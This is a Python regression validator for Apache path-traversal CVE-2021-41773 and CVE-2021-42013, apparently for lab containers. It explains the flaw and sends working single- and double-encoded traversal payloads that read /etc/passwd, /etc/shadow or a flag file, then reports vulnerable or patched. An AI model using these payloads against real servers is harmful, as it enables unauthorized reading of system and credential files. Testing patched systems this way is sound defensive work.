#!/usr/bin/env python3
"""
validate_traversal.py — Path Traversal Regression Validator
============================================================
CVE-2021-41773 / CVE-2021-42013 — Apache HTTP Server 2.4.49 / 2.4.50

PURPOSE
-------
This script sends the historically documented path-traversal HTTP request
patterns against a target Apache server and reports whether the server is
vulnerable (discloses the requested file) or patched (rejects the request).

It is used in two ways:
  1. Against the VULNERABLE container (127.0.0.1:8080) — expected result:
     HTTP 200, file content returned.
  2. Against the PATCHED container (127.0.0.1:8081) — expected result:
     HTTP 400 Bad Request (2.4.51 rejects malformed encoded paths).

HOW THE FLAW WORKS (root cause summary)
----------------------------------------
Apache 2.4.49 introduced a change to ap_normalize_path() in server/util.c.
The new code decoded URL percent-encoding BEFORE checking for ".." sequences.
When a dot (".") was encoded as "%2e", the path "/cgi-bin/.%2e/../etc/passwd"
would be decoded to "/cgi-bin/../../etc/passwd" after normalization, escaping
the document root.

CVE-2021-42013 (2.4.50 bypass):
  The 2.4.50 fix added a check for "%2e" but could be bypassed with
  double-encoding: "%25" encodes the "%" sign, so "%%32%65" (or ".%252e")
  decodes in two passes to ".." and still traverses out of the root.

USAGE
-----
  python validate_traversal.py [OPTIONS]

  Options:
    --url URL        Target base URL (default: http://127.0.0.1:8080)
    --file PATH      Remote file path to attempt reading (default: /etc/passwd)
    --mode {41773,42013,both}
                     Which CVE request pattern to use (default: both)
    --timeout SECS   HTTP request timeout in seconds (default: 10)
    --verbose        Print full raw HTTP response headers

  Examples:
    python validate_traversal.py --url http://127.0.0.1:8080
    python validate_traversal.py --url http://127.0.0.1:8080 --file /var/secret/confidential_token.txt
    python validate_traversal.py --url http://127.0.0.1:8081 --file /etc/passwd

DEPENDENCIES
------------
  Standard library only — no pip install required.
  Uses http.client directly to prevent urllib from re-encoding our
  deliberately malformed URL paths.
"""

import argparse
import http.client
import sys
import urllib.parse
from datetime import datetime


# =============================================================================
# ANSI colour helpers (degrades gracefully on Windows without ANSI support)
# =============================================================================
def _supports_colour() -> bool:
    """Return True if the terminal supports ANSI escape codes."""
    import os
    return sys.stdout.isatty() and os.name != "nt" or _win_ansi_enabled()


def _win_ansi_enabled() -> bool:
    """Enable Windows Virtual Terminal Processing if available."""
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        # Enable ENABLE_VIRTUAL_TERMINAL_PROCESSING (0x0004)
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        return True
    except Exception:
        return False


RED    = "\033[91m" if _supports_colour() else ""
GREEN  = "\033[92m" if _supports_colour() else ""
YELLOW = "\033[93m" if _supports_colour() else ""
CYAN   = "\033[96m" if _supports_colour() else ""
BOLD   = "\033[1m"  if _supports_colour() else ""
RESET  = "\033[0m"  if _supports_colour() else ""


# =============================================================================
# Path-traversal payload definitions
# =============================================================================

# Each payload must traverse from the URI alias (/icons/ or /cgi-bin/) up to
# the filesystem root and then down into the target file path.
# The alias itself accounts for one directory level, so we need enough "../"
# repetitions to reach root from there.
#
# We prefix via /icons/ because it is present in default Apache installs
# (unlike /cgi-bin/ which may not exist in some minimal setups).
# The scanner tries /icons/ first, falls back to /cgi-bin/.

def _build_payload_41773(target_file: str) -> str:
    """
    CVE-2021-41773 traversal pattern.
    Uses single URL-encoding: '.' -> '%2e'
    /icons/.%2e/.%2e/.%2e/.%2e/etc/passwd

    Traversal depth from /usr/local/apache2/icons/:
      .%2e -> /usr/local/apache2/
      .%2e -> /usr/local/
      .%2e -> /usr/
      .%2e -> /   (root)
      then: etc/passwd -> /etc/passwd
    """
    file_path = target_file.lstrip("/")
    # 4 x .%2e to traverse: icons -> apache2 -> local -> usr -> /
    traversal = ".%2e/.%2e/.%2e/.%2e"
    return f"/icons/{traversal}/{file_path}"


def _build_payload_42013(target_file: str) -> str:
    """
    CVE-2021-42013 traversal pattern (2.4.50 bypass).
    Uses double-encoding: '%' -> '%25', so '..' -> '.%252e'
    /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd

    %%32%65 double-decodes:
      First pass:  %%32%65 -> %2e
      Second pass: %2e     -> .  (== a dot, so .%%32%65 == ..)
    Same 4-level depth as the 41773 payload.
    """
    file_path = target_file.lstrip("/")
    traversal = ".%%32%65/.%%32%65/.%%32%65/.%%32%65"
    return f"/icons/{traversal}/{file_path}"


# =============================================================================
# HTTP request (raw — bypasses urllib normalisation)
# =============================================================================

def send_raw_request(host: str, port: int, path: str, timeout: int,
                     use_tls: bool = False) -> tuple:
    """
    Send a GET request with the given raw path.

    We use http.client directly (rather than urllib.request) because:
      - urllib normalises URL paths, which would undo our encoded traversal.
      - http.client sends the path string verbatim (no re-encoding).

    Returns:
      (status_code: int, headers: dict, body: str, raw_path: str)
    """
    try:
        if use_tls:
            conn = http.client.HTTPSConnection(host, port, timeout=timeout)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)

        conn.request("GET", path, headers={
            "Host": f"{host}:{port}",
            "User-Agent": "CVE-Lab-Validator/1.0 (Research Only)",
            "Accept": "*/*",
            "Connection": "close",
        })
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", errors="replace")
        headers = dict(resp.getheaders())
        conn.close()
        return resp.status, headers, body, path

    except ConnectionRefusedError:
        print(f"\n{RED}[ERROR] Connection refused — is the container running?{RESET}")
        print(f"        Target: {host}:{port}")
        sys.exit(2)
    except OSError as exc:
        print(f"\n{RED}[ERROR] Network error: {exc}{RESET}")
        sys.exit(2)


# =============================================================================
# Result analysis
# =============================================================================

def analyse_response(status: int, body: str, target_file: str,
                     cve_mode: str) -> dict:
    """
    Determine whether the response indicates a vulnerable or patched server.

    A server is considered VULNERABLE if:
      - HTTP status is 200 (file disclosed), AND
      - The response body contains content consistent with the target file.

    A server is considered PATCHED if:
      - HTTP status is 400 (Apache 2.4.51 rejects malformed encoded paths), OR
      - HTTP status is 403 Forbidden (directory ACL blocked traversal).
    """
    result = {
        "cve_mode": cve_mode,
        "http_status": status,
        "vulnerable": False,
        "verdict": "UNKNOWN",
        "evidence_snippet": "",
    }

    if status == 200:
        # Check for content indicators that confirm the file was actually served
        indicators = {
            "/etc/passwd": ["root:", "daemon:", "nobody:", "/bin/"],
            "/etc/issue": ["Linux", "Alpine", "Debian", "Ubuntu", "Lab Container"],
            "/var/secret/confidential_token.txt": ["FLAG{"],
            "/etc/shadow": ["root:", "daemon:"],
            "/etc/hostname": [],   # any 200 is enough
        }
        # Pick the right indicator set, or fall back to length heuristic
        file_lower = target_file.lower()
        matched_indicators = []
        for key, hints in indicators.items():
            if key in file_lower:
                matched_indicators = hints
                break

        content_confirmed = (
            any(hint in body for hint in matched_indicators)
            if matched_indicators
            else len(body.strip()) > 0
        )

        if content_confirmed:
            result["vulnerable"] = True
            result["verdict"] = "VULNERABLE"
            # Extract up to 3 lines of evidence from the response body
            snippet_lines = [
                line for line in body.splitlines()
                if line.strip()
            ][:3]
            result["evidence_snippet"] = "\n        ".join(snippet_lines)
        else:
            result["verdict"] = "INCONCLUSIVE (200 but no content match)"

    elif status in (400, 403, 404):
        result["vulnerable"] = False
        status_meaning = {
            400: "Bad Request (malformed path rejected)",
            403: "Forbidden (ACL blocked traversal)",
            404: "Not Found (traversal path not resolved)",
        }
        result["verdict"] = f"PATCHED / SECURE — HTTP {status} {status_meaning.get(status, '')}"
    else:
        result["verdict"] = f"INCONCLUSIVE (HTTP {status})"

    return result


# =============================================================================
# Pretty printer
# =============================================================================

def print_result(result: dict, path: str, verbose: bool, headers: dict) -> None:
    status  = result["http_status"]
    verdict = result["verdict"]
    mode    = result["cve_mode"]

    colour = GREEN if not result["vulnerable"] else RED
    symbol = "[OK] " if not result["vulnerable"] else "[!!]"

    print(f"\n  {BOLD}[{mode}]{RESET}")
    print(f"  Path sent : {CYAN}{path}{RESET}")
    print(f"  HTTP      : {status}")
    print(f"  Verdict   : {colour}{BOLD}{symbol} {verdict}{RESET}")

    if result["evidence_snippet"]:
        print(f"  Evidence  :")
        print(f"        {YELLOW}{result['evidence_snippet']}{RESET}")

    if verbose:
        print(f"\n  Response Headers:")
        for k, v in headers.items():
            print(f"    {k}: {v}")


# =============================================================================
# Banner / server header check
# =============================================================================

def check_server_banner(host: str, port: int, timeout: int) -> str:
    """
    Perform a normal GET / request and inspect the Server header.
    Returns the raw Server header value, or empty string if absent.
    """
    try:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        conn.request("GET", "/", headers={"Host": f"{host}:{port}"})
        resp = conn.getresponse()
        resp.read()
        server = resp.getheader("Server", "")
        conn.close()
        return server
    except Exception:
        return ""


# =============================================================================
# Main
# =============================================================================

def main() -> int:
    parser = argparse.ArgumentParser(
        description="CVE-2021-41773/42013 Path Traversal Regression Validator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python validate_traversal.py --url http://127.0.0.1:8080
  python validate_traversal.py --url http://127.0.0.1:8080 --file /var/secret/confidential_token.txt
  python validate_traversal.py --url http://127.0.0.1:8081 --mode 41773
        """,
    )
    parser.add_argument(
        "--url", default="http://127.0.0.1:8080",
        help="Target base URL (default: http://127.0.0.1:8080)"
    )
    parser.add_argument(
        "--file", default="/etc/passwd",
        help="Remote file path to attempt reading (default: /etc/passwd)"
    )
    parser.add_argument(
        "--mode", choices=["41773", "42013", "both"], default="both",
        help="CVE request pattern variant (default: both)"
    )
    parser.add_argument(
        "--timeout", type=int, default=10,
        help="Request timeout in seconds (default: 10)"
    )
    parser.add_argument(
        "--verbose", action="store_true",
        help="Print full response headers"
    )
    args = parser.parse_args()

    # Parse host/port from URL
    parsed = urllib.parse.urlparse(args.url)
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_tls = parsed.scheme == "https"

    print(f"\n{BOLD}{'='*65}{RESET}")
    print(f"{BOLD}  CVE-2021-41773 / CVE-2021-42013 — Path Traversal Validator{RESET}")
    print(f"{BOLD}{'='*65}{RESET}")
    print(f"  Target      : {args.url}")
    print(f"  Target file : {args.file}")
    print(f"  Mode        : {args.mode}")
    print(f"  Timestamp   : {datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')}")
    print(f"{BOLD}{'='*65}{RESET}")

    # ---- Banner check ----
    server_header = check_server_banner(host, port, args.timeout)
    print(f"\n  Server header : {CYAN}{server_header or '(not present / suppressed)'}{RESET}")

    vulnerable_versions = ["2.4.49", "2.4.50"]
    if any(v in server_header for v in vulnerable_versions):
        print(f"  Banner check  : {RED}FLAGGED — version in vulnerable range{RESET}")
    elif server_header:
        print(f"  Banner check  : {GREEN}OK — version not in known-vulnerable range{RESET}")
    else:
        print(f"  Banner check  : {YELLOW}UNKNOWN — Server header absent or suppressed{RESET}")

    # ---- Traversal probes ----
    modes_to_run = (
        ["41773", "42013"] if args.mode == "both"
        else [args.mode]
    )

    overall_vulnerable = False
    results = []

    for mode in modes_to_run:
        if mode == "41773":
            path = _build_payload_41773(args.file)
        else:
            path = _build_payload_42013(args.file)

        print(f"\n  {BOLD}--- Sending {mode} probe ---{RESET}")
        status, headers, body, sent_path = send_raw_request(
            host, port, path, args.timeout, use_tls
        )
        result = analyse_response(status, body, args.file, f"CVE-2021-{mode}")
        print_result(result, sent_path, args.verbose, headers)
        results.append(result)
        if result["vulnerable"]:
            overall_vulnerable = True

    # ---- Final summary ----
    print(f"\n{BOLD}{'='*65}{RESET}")
    if overall_vulnerable:
        print(f"  {RED}{BOLD}[!!] FINAL VERDICT: VULNERABLE{RESET}")
        print(f"  {RED}Target is susceptible to path traversal (CVE-2021-41773/42013).{RESET}")
        print(f"  {RED}Remediate by upgrading Apache to 2.4.51 or higher.{RESET}")
    else:
        print(f"  {GREEN}{BOLD}[OK] FINAL VERDICT: PATCHED / SECURE{RESET}")
        print(f"  {GREEN}Target correctly rejected traversal request patterns.{RESET}")
    print(f"{BOLD}{'='*65}{RESET}\n")

    # Exit code: 1 = vulnerable, 0 = secure (machine-readable for CI/CD)
    return 1 if overall_vulnerable else 0


if __name__ == "__main__":
    sys.exit(main())
